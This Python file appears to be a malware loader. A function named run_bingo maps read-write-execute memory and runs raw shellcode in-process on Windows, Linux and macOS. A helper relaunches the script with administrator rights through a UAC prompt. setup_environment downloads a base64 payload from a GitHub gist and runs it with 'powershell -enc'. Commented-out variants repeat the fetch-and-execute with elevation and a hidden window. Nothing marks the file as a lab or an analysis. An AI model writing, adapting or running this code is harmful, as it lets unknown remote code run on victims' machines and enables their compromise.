import subprocess
import ctypes
import sys
import os
import requests
from ctypes import wintypes
from typing import Final, Callable

# --------------------------------------------------------------------------- #
# Platform Detection & Constants
# --------------------------------------------------------------------------- #
IS_WINDOWS: Final[bool] = sys.platform.startswith("win")
IS_LINUX: Final[bool] = sys.platform.startswith("linux")
IS_DARWIN: Final[bool] = sys.platform.startswith("darwin")

if not (IS_WINDOWS or IS_LINUX or IS_DARWIN):
    raise RuntimeError(f"Unsupported platform: {sys.platform}")

PAGE_SIZE: Final[int] = 4096  # Standard page size (works on x86, x64, ARM)

# --------------------------------------------------------------------------- #
# Windows Setup
# --------------------------------------------------------------------------- #
if IS_WINDOWS:
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    PAGE_EXECUTE_READWRITE: Final[int] = 0x40
    MEM_COMMIT: Final[int] = 0x1000
    MEM_RESERVE: Final[int] = 0x2000
    MEM_RELEASE: Final[int] = 0x8000

    kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    kernel32.VirtualAlloc.restype = wintypes.LPVOID

    kernel32.VirtualFree.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]
    kernel32.VirtualFree.restype = wintypes.BOOL

    kernel32.GetLastError.restype = wintypes.DWORD

    def _alloc(size: int) -> int:
        aligned_size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1)
        addr = kernel32.VirtualAlloc(None, aligned_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not addr:
            raise RuntimeError(f"VirtualAlloc failed: error {kernel32.GetLastError()}")
        return addr

    def _free(addr: int, size: int) -> None:
        aligned_size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1)
        if not kernel32.VirtualFree(addr, 0, MEM_RELEASE):
            raise RuntimeError(f"VirtualFree failed: error {kernel32.GetLastError()}")

# --------------------------------------------------------------------------- #
# POSIX Setup (Linux / macOS)
# --------------------------------------------------------------------------- #
else:
    libc = ctypes.CDLL("libc.so.6" if IS_LINUX else "libc.dylib")

    PROT_READ: Final[int] = 1
    PROT_WRITE: Final[int] = 2
    PROT_EXEC: Final[int] = 4
    MAP_PRIVATE: Final[int] = 2
    MAP_ANONYMOUS: Final[int] = 0x20 if IS_LINUX else 0x1000  # macOS uses 0x1000

    # mmap
    libc.mmap.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
        ctypes.c_int, ctypes.c_int, ctypes.c_size_t
    ]
    libc.mmap.restype = ctypes.c_void_p

    # munmap
    libc.munmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
    libc.munmap.restype = ctypes.c_int

    # Optional: cache flush (for JIT-like code on some arches)
    try:
        libc.__clear_cache.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
        libc.__clear_cache.restype = None
        HAS_CLEAR_CACHE = True
    except AttributeError:
        HAS_CLEAR_CACHE = False

    def _alloc(size: int) -> int:
        aligned_size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1)
        addr = libc.mmap(
            None,
            aligned_size,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0
        )
        if addr == -1 or addr == 0xFFFFFFFFFFFFFFFF:  # mmap returns -1 on error (sign-extended)
            raise RuntimeError(f"mmap failed: {os.strerror(ctypes.get_errno())}")
        return addr

    def _free(addr: int, size: int) -> None:
        aligned_size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1)
        if libc.munmap(addr, aligned_size) != 0:
            raise RuntimeError(f"munmap failed: {os.strerror(ctypes.get_errno())}")

    def _flush_cache(addr: int, size: int) -> None:
        if HAS_CLEAR_CACHE:
            libc.__clear_cache(addr, addr + size)


# --------------------------------------------------------------------------- #
# Public Function: run_bingo
# --------------------------------------------------------------------------- #
def run_bingo(shellcode: bytes) -> None:
    """
    Execute raw shellcode in the current process.

    Allocates executable memory, copies shellcode, executes it, and frees memory.

    Parameters
    ----------
    shellcode : bytes
        Raw machine code to execute.

    Raises
    ------
    ValueError
        If shellcode is empty.
    RuntimeError
        If memory allocation, copy, execution, or cleanup fails.
    """
    if not shellcode:
        raise ValueError("shellcode must not be empty")

    size = len(shellcode)
    if size == 0:
        return  # Safety

    addr = _alloc(size)
    if not addr:
        raise RuntimeError("Memory allocation returned null pointer")

    try:
        # Copy shellcode
        ctypes.memmove(addr, shellcode, size)

        # Flush instruction cache if needed (important on ARM, some x86)
        if not IS_WINDOWS and HAS_CLEAR_CACHE:
            _flush_cache(addr, size)

        # Create callable
        CFUNC = ctypes.CFUNCTYPE(None)
        func: Callable[[], None] = CFUNC(addr)

        # Execute
        func()

    except Exception as e:
        raise RuntimeError(f"Execution failed: {e}") from e
    finally:
        try:
            _free(addr, size)
        except Exception as e:
            print(f"Warning: Failed to free memory: {e}", file=sys.stderr)


def run_as_admin():
    # Check if already running with admin rights
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    
    if is_admin:
        return True  # Already admin, proceed normally
    
    # Re-launch this exact Python script with admin rights
    params = f'"{sys.executable}" ' + ' '.join(f'"{arg}"' for arg in sys.argv)
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, params, None, 1
    )
    return False  # Script will exit and restart elevated

def setup_environment():
    resp = requests.get("https://gist.githubusercontent.com/secteam911/89a124dd7dbcd44c33b7509fafbc3555/raw/1fc19e3a9655885260051b508cb3f9b15e501796/sec.txt")
    b64 = resp.text.replace("\r", "").replace("\n", "").strip()
    # run_as_admin()


    # result = subprocess.run(
    #     ["powershell.exe", "-EncodedCommand", "-"],
    #     input=b64,
    #     text=True,               # b64 is str
    #     capture_output=True,
    #     creationflags=subprocess.CREATE_NO_WINDOW  # optional: no flashing window
    # )


    # subprocess.run([
    #     'powershell', '-NoProfile', '-Command',
    #     "if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')){Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -Command invoke-webrequest ''https://gist.githubusercontent.com/secteam911/89a124dd7dbcd44c33b7509fafbc3555/raw/d0a8f588eaf3c059a95d343d26f5794c2b8c5831/sec.txt'' -UseBasicParsing | %{powershell -enc $_.Content}';exit};invoke-webrequest 'https://gist.githubusercontent.com/secteam911/89a124dd7dbcd44c33b7509fafbc3555/raw/d0a8f588eaf3c059a95d343d26f5794c2b8c5831/sec.txt' -UseBasicParsing | %{powershell -enc $_.Content}"
    # ], creationflags=subprocess.CREATE_NO_WINDOW)

    # The three commands you want to execute in sequence inside the same PowerShell session
    commands = [
        # '$url = "https://gist.githubusercontent.com/secteam911/89a124dd7dbcd44c33b7509fafbc3555/raw/d0a8f588eaf3c059a95d343d26f5794c2b8c5831/sec.txt"',
        # '$content = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content',
        f'powershell -enc {b64}'
    ]

    # Join them with semicolons or newlines so they run sequentially
    powershell_command = "; ".join(commands)

    # Or use newlines for better readability (PowerShell accepts them)
    # powershell_command = "\n".join(commands) + "\n"

    # Run it
    process = subprocess.Popen(
        ['powershell', '-NoProfile', '-Command', powershell_command],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding='utf-8',
        errors='replace'
    )

    # Capture output
    stdout, stderr = process.communicate()

    # print("STDOUT:")
    # print(stdout)
    # print("STDERR:")
    # print(stderr)
    # print(f"Return code: {process.returncode}")
